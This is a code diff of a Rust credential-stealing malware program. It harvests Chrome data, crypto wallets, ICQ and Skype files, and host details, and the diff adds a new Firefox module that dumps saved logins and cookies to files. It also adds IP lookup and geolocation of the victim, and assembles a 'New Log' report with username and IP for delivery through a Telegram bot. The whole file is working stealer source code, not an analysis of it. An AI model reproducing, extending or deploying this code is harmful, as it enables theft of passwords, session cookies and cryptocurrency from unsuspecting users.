@@ -4,6 +4,7 @@ mod chrome_grabber;
 mod messengers;
 mod other_grabber;
 mod wallet_grabber;
+mod firefox_grabber;
 
 extern crate serde;
 
@@ -18,7 +19,8 @@ use walkdir::{DirEntry, WalkDir};
 use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
 use wmi::{COMLibrary, WMIConnection};
 use zip::{result::ZipError, write::FileOptions};
-
+use hyper::Client;
+use hyper::body::Buf;
 #[allow(dead_code)]
 enum DeliveryMethod {
     TELEGRAM,
@@ -26,7 +28,7 @@ enum DeliveryMethod {
     NONE,
 }
 
-const MODE: DeliveryMethod = DeliveryMethod::TELEGRAM;
+const MODE: DeliveryMethod = DeliveryMethod::NONE;
 //TG
 const BOT_TOKEN: &str = "";
 const CHANNEL_ID: i64 = -0;
@@ -40,6 +42,24 @@ static mut PASSWORDS: usize = 0;
 static mut WALLETS: usize = 0;
 static mut FILES: usize = 0;
 static mut CREDIT_CARDS: usize = 0;
+
+#[derive(serde::Deserialize,Debug)]
+struct Data {
+	origin: String,
+}
+
+async fn getip() -> Result<String, Box<dyn std::error::Error + Send + Sync>> { 
+ 
+    
+    let url = "http://httpbin.org/ip".parse().unwrap();
+    let res = Client::new().get(url).await.unwrap(); //  - для обработки ошибки, если не использовать match
+    
+    let body = hyper::body::aggregate(res).await.unwrap();
+    
+    let deserialized: Data = serde_json::from_reader(body.reader()).unwrap();
+
+    Ok(deserialized.origin)
+}
 
 #[tokio::main]
 async fn main() {
@@ -55,19 +75,26 @@ async fn main() {
         }
     }
 
+ 
+
+
+
     let _ = std::fs::OpenOptions::new()
         .write(true)
         .create(true)
         .attributes(FILE_ATTRIBUTE_HIDDEN)
         .open(mutex_file);
 
-    std::fs::create_dir(string_path);
+    let _ = std::fs::create_dir(string_path);
 
     let language = format!("{:?}", whoami::lang().collect::<Vec<String>>());
     let mut sys = System::new_all();
     sys.refresh_all();
 
-    let city = match Locator::get(&my_internet_ip::get().unwrap().to_string(), Service::IpApi).await
+
+    let ip = getip().await.unwrap();
+
+    let city = match Locator::get(&ip, Service::IpApi).await
     {
         Ok(ip) => format!(
             "Country: {}\nCity: {}\nTimezone:{}\nCordinates:{} - {}",
@@ -95,7 +122,7 @@ async fn main() {
     sysinfo.push(format!("Hostname: {}", whoami::hostname()));
     sysinfo.push(format!(
         "IP: {}",
-        my_internet_ip::get().unwrap().to_string()
+        ip
     ));
     sysinfo.push(city);
 
@@ -106,7 +133,7 @@ async fn main() {
 
     std::fs::File::create(format!("{}\\info.txt", string_path))
         .unwrap()
-        .write_all(sysinfo.join("").as_bytes())
+        .write_all(sysinfo.join("\n").as_bytes())
         .unwrap();
 
     let mut system_info = vec![];
@@ -140,7 +167,7 @@ async fn main() {
         .unwrap();
 
     //TODO Make A Method in each Package.
-    chrome_grabber::main::chrome_main();
+    chrome_grabber::main::chrome_main(); 
     wallet_grabber::wallets::grab_cold_wallets();
     wallet_grabber::wallets::steal_browser_wallets();
 
@@ -154,11 +181,28 @@ async fn main() {
     messengers::icq::steal_icq();
     messengers::skype::steal_skype();
 
+    let ff_logins = firefox_grabber::firefox::get_all_logins().await.ok();
+    if ff_logins.is_some() {
+        let mut formatted_logins = vec![];
+        for (site, login) in ff_logins.unwrap().iter() {
+            formatted_logins.push(format!("{} {}", site, format!("{}", login.iter().map(|f| f.to_string()).collect::<String>())));
+        }
+        std::fs::write(format!("{}\\firefox_logins.txt", string_path), formatted_logins.join("\n")).unwrap();
+    }
+
+    let ff_cookies = firefox_grabber::firefox::cookie_stealer();
+    if ff_cookies.len() > 0 {
+        std::fs::write(format!("{}\\firefox_cookies.txt", string_path), ff_cookies.join("\n")).unwrap();
+    }
+
+    
+ 
+        
     unsafe {
         let mut msg_edit = vec![];
         msg_edit.push(format!(
             "**New Log From ({} / {} )**\n",
-            my_internet_ip::get().unwrap().to_string(),
+            ip,
             whoami::lang().collect::<Vec<String>>().first().unwrap()
         ));
         msg_edit.push(format!("User: {}\n", whoami::username()));
